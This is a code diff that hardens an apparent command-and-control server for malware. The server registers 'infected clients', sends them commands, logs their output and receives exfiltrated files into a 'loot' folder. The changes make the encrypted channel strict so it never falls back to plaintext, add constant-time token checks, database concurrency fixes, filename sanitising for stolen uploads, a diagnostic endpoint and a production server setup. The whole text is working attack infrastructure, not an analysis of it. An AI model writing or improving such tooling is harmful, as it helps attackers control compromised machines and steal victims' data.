@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import functools
+import hmac
 import threading
 import logging
 import base64
@@ -18,6 +19,8 @@ log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
+# Reject oversized request bodies before buffering them (Flask answers 413)
+app.config["MAX_CONTENT_LENGTH"] = 100 * 1024 * 1024
 
 # === Operator Authentication ===
 OPERATOR_TOKEN = os.getenv("OPERATOR_TOKEN", "")
@@ -37,17 +40,25 @@ def require_auth(f):
         token = request.headers.get("Authorization", "")
         if not token.startswith("Bearer "):
             return jsonify({"error": "Missing or invalid Authorization header"}), 401
-        if token[7:] != OPERATOR_TOKEN:
+        if not hmac.compare_digest(token[7:], OPERATOR_TOKEN):
             return jsonify({"error": "Invalid operator token"}), 403
         return f(*args, **kwargs)
     return decorated
 
 DB_FILE = "aerocommand.db"
 
+def db_connect():
+    """Open a DB connection tuned for concurrent access (Flask threads + CLI)"""
+    conn = sqlite3.connect(DB_FILE, timeout=10)
+    conn.execute("PRAGMA busy_timeout = 5000")
+    return conn
+
 def init_db():
     """Initialize SQLite database for storing clients, commands, and logs"""
-    with sqlite3.connect(DB_FILE) as conn:
+    with db_connect() as conn:
         cursor = conn.cursor()
+        # WAL mode: concurrent readers don't block the heartbeat/API writers
+        cursor.execute("PRAGMA journal_mode=WAL")
         cursor.execute("""
             CREATE TABLE IF NOT EXISTS clients (
                 client_id TEXT PRIMARY KEY,
@@ -77,7 +88,7 @@ def db_save_client(info):
     """Save or update client registration in SQLite"""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
-        with sqlite3.connect(DB_FILE) as conn:
+        with db_connect() as conn:
             cursor = conn.cursor()
             cursor.execute("""
                 INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
@@ -105,7 +116,7 @@ def db_log_command(client_id, command, output):
     """Log executed command output into SQLite"""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
-        with sqlite3.connect(DB_FILE) as conn:
+        with db_connect() as conn:
             cursor = conn.cursor()
             cursor.execute("""
                 INSERT INTO command_logs (client_id, command, output, timestamp)
@@ -126,6 +137,7 @@ target_client = None
 # === AES-256 + RSA Hybrid Encryption ===
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.Hash import SHA256
 from Crypto.Random import get_random_bytes
 
 # Generate or load server RSA key pair
@@ -162,44 +174,25 @@ def decrypt_aes(raw_b64: str, aes_key: bytes) -> str:
     return decrypted.decode('utf-8')
 
 def decrypt_payload(client_id=None):
-    """Decrypt incoming AES-encrypted request body using client's session key"""
-    # Allow client_id from query params (for /result and /upload)
+    """Decrypt incoming request body. Strict: only two formats are accepted.
+    1. Hybrid RSA+AES JSON packet (/register handshake)
+    2. AES-256-GCM binary body (all other endpoints)
+    Plaintext JSON is rejected — the channel cannot degrade."""
     if not client_id:
         client_id = request.args.get("id")
 
-    # 1. Try to get JSON directly (handles application/json)
+    # 1. Hybrid RSA+AES registration packet (application/json)
     data = request.get_json(silent=True)
-    
-    # 2. If not JSON, get raw data (handles application/octet-stream)
-    if not data:
-        raw = request.get_data(as_text=True)
-        if not raw:
-            return {}
-        try:
-            # Check if it's a plain JSON string
-            data = json.loads(raw)
-        except (json.JSONDecodeError, ValueError):
-            # If not JSON, it must be encrypted binary
-            aes_key = client_sessions.get(client_id) if client_id else None
-            if aes_key:
-                try:
-                    decrypted = decrypt_aes(raw, aes_key)
-                    return json.loads(decrypted)
-                except Exception as e:
-                    print(f"[!] AES Decryption failed: {e}")
-            return {}
-
-    # 3. Handle Hybrid RSA+AES (Registration)
     if isinstance(data, dict) and "encrypted_session_key" in data and "payload" in data:
         try:
             print("[*] Processing hybrid RSA+AES registration packet...")
-            rsa_cipher = PKCS1_OAEP.new(server_rsa_key)
+            rsa_cipher = PKCS1_OAEP.new(server_rsa_key, hashAlgo=SHA256)
             enc_session_key = base64.b64decode(data["encrypted_session_key"])
             aes_key = rsa_cipher.decrypt(enc_session_key)
-            
+
             decrypted_inner = decrypt_aes(data["payload"], aes_key)
             inner_payload = json.loads(decrypted_inner)
-            
+
             cid = inner_payload.get("client_id")
             if cid:
                 with session_lock:
@@ -212,14 +205,26 @@ def decrypt_payload(client_id=None):
             traceback.print_exc()
             return {}
 
-    return data if isinstance(data, dict) else {}
+    # 2. AES-GCM binary body (application/octet-stream)
+    raw = request.get_data()
+    if not raw:
+        return {}
+    aes_key = client_sessions.get(client_id) if client_id else None
+    if not aes_key:
+        print(f"[!] Rejected plaintext/unregistered payload from {request.remote_addr}")
+        return {}
+    try:
+        return json.loads(decrypt_aes(raw.decode('utf-8'), aes_key))
+    except Exception as e:
+        print(f"[!] AES Decryption failed: {e}")
+        return {}
 
 def encrypt_response(data, client_id=None):
-    """Encrypt outgoing response dict using client's AES session key or fallback to JSON"""
-    json_str = json.dumps(data)
+    """Encrypt outgoing response dict with the client's AES session key.
+    Returns an empty body when no session exists — never plaintext."""
     if client_id and client_id in client_sessions:
-        return encrypt_aes(json_str, client_sessions[client_id])
-    return json_str
+        return encrypt_aes(json.dumps(data), client_sessions[client_id])
+    return ""
 
 # === ANSI Colors ===
 class C:
@@ -234,6 +239,15 @@ class C:
     BOLD = "\033[1m"
     DIM = "\033[2m"
     RESET = "\033[0m"
+
+def sanitize_filename(name: str) -> str:
+    """Strip directory components and unsafe characters from a client-supplied
+    filename — prevents path traversal out of the loot directory."""
+    base = os.path.basename(name.replace("\\", "/")).strip()
+    cleaned = "".join(c if (c.isascii() and (c.isalnum() or c in ".-_")) else "_" for c in base)[:200]
+    if not cleaned or set(cleaned) <= {"."}:
+        return "unnamed_file"
+    return cleaned
 
 LOOT_DIR = "loot"
 HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
@@ -250,6 +264,48 @@ def test():
 def get_rsa_pub():
     """Provide server RSA public key for client hybrid encryption handshake"""
     return server_rsa_public, 200
+
+
+@app.route("/api/diag", methods=["POST", "OPTIONS"])
+@require_auth
+def api_diag():
+    """Diagnostic endpoint: attempt to decrypt a registration packet and return detailed errors."""
+    if request.method == "OPTIONS":
+        return "", 200
+    import traceback as _tb
+    results = {"steps": []}
+    try:
+        data = request.get_json(silent=True)
+        results["got_json"] = isinstance(data, dict)
+        results["json_keys"] = list(data.keys()) if isinstance(data, dict) else None
+        if not isinstance(data, dict) or "encrypted_session_key" not in data:
+            results["error"] = "No hybrid packet found in JSON body"
+            return jsonify(results), 200
+
+        results["steps"].append("JSON parsed OK")
+
+        # RSA decrypt
+        enc_session_key = base64.b64decode(data["encrypted_session_key"])
+        results["rsa_ciphertext_len"] = len(enc_session_key)
+        results["server_rsa_key_bits"] = server_rsa_key.size_in_bits()
+        results["steps"].append(f"RSA ciphertext: {len(enc_session_key)} bytes")
+
+        rsa_cipher = PKCS1_OAEP.new(server_rsa_key, hashAlgo=SHA256)
+        aes_key = rsa_cipher.decrypt(enc_session_key)
+        results["aes_key_len"] = len(aes_key)
+        results["steps"].append(f"RSA decrypted OK, AES key: {len(aes_key)} bytes")
+
+        # AES decrypt
+        decrypted_inner = decrypt_aes(data["payload"], aes_key)
+        results["steps"].append("AES decrypted OK")
+        inner = json.loads(decrypted_inner)
+        results["steps"].append("JSON parsed inner payload OK")
+        results["client_id"] = inner.get("client_id")
+        results["success"] = True
+    except Exception as e:
+        results["error"] = str(e)
+        results["traceback"] = _tb.format_exc()
+    return jsonify(results), 200
 
 
 @app.route("/register", methods=["POST"])
@@ -322,8 +378,9 @@ def get_command():
     # Update heartbeat
     with cmd_lock:
         if client_id not in infected_clients:
-            # Unknown client — server was restarted, tell client to re-register
-            return encrypt_response({"action": "re-register"}), 200
+            # Unknown client — server was restarted and lost the session key.
+            # Signal via 401 (empty body) so the channel never carries plaintext.
+            return "", 401
 
         infected_clients[client_id]['last_seen'] = datetime.now()
 
@@ -341,6 +398,8 @@ def post_result():
     # client_id passed as query param by client
     cid_from_param = request.args.get("id")
     data = decrypt_payload(client_id=cid_from_param)
+    if not data:
+        return "Undecryptable payload", 400
     output = data.get('output', '')
     client_id = data.get('client_id', request.remote_addr)
     timestamp = datetime.now().strftime("%H:%M:%S")
@@ -355,6 +414,8 @@ def post_result():
     print(f"\n{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET}")
     print(output)
     results.append({"client": client_id, "output": output, "time": timestamp})
+    if len(results) > 500:
+        del results[:-500]
     command_name = data.get("command", "COMMAND_RESULT")
     db_log_command(client_id, command_name, output)
     print(PROMPT, end="", flush=True)
@@ -366,7 +427,9 @@ def upload_file():
     """Receive exfiltrated files from clients"""
     cid_from_param = request.args.get("id")
     data = decrypt_payload(client_id=cid_from_param)
-    filename = data.get("name", "unknown")
+    if not data:
+        return "Undecryptable payload", 400
+    filename = sanitize_filename(data.get("name", "unknown"))
     file_b64 = data.get("file", "")
     if len(file_b64) > 150 * 1024 * 1024:  # ~112MB decoded (base64 is ~1.33x)
         print(f"[!] Rejected oversized upload from {data.get('client_id', '?')}: {len(file_b64)} chars")
@@ -449,7 +512,7 @@ def api_get_logs():
         return "", 200
 
     log_list = []
-    with sqlite3.connect(DB_FILE) as conn:
+    with db_connect() as conn:
         cursor = conn.cursor()
         cursor.execute("SELECT id, client_id, command, output, timestamp FROM command_logs ORDER BY id DESC LIMIT 100")
         for row in cursor.fetchall():
@@ -663,7 +726,7 @@ def input_thread_func():
                 show_clients()
 
             elif cmd.lower() == "db clients":
-                with sqlite3.connect(DB_FILE) as conn:
+                with db_connect() as conn:
                     cursor = conn.cursor()
                     cursor.execute("SELECT client_id, host, ip, pid, user, first_seen, last_seen, status FROM clients")
                     rows = cursor.fetchall()
@@ -678,7 +741,7 @@ def input_thread_func():
             elif cmd.lower().startswith("db logs"):
                 parts = cmd.split()
                 limit = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 10
-                with sqlite3.connect(DB_FILE) as conn:
+                with db_connect() as conn:
                     cursor = conn.cursor()
                     cursor.execute("SELECT id, client_id, timestamp, output FROM command_logs ORDER BY id DESC LIMIT ?", (limit,))
                     rows = cursor.fetchall()
@@ -785,5 +848,11 @@ if __name__ == "__main__":
     else:
         print(f"{C.CYAN}[i] Cloud/Headless mode detected (no TTY) — Web C2 endpoints are active.{C.RESET}")
 
-    # Run Flask on main thread (keeps web service alive and healthy on Render/cloud)
-    app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)
+    # Production WSGI server (waitress) with graceful fallback to the Flask dev server
+    try:
+        from waitress import serve
+        print(f"{C.GREEN}[+] Serving via waitress (production WSGI, 8 threads){C.RESET}")
+        serve(app, host="0.0.0.0", port=server_port, threads=8)
+    except ImportError:
+        print(f"{C.YELLOW}[!] waitress not installed — falling back to Flask dev server{C.RESET}")
+        app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)
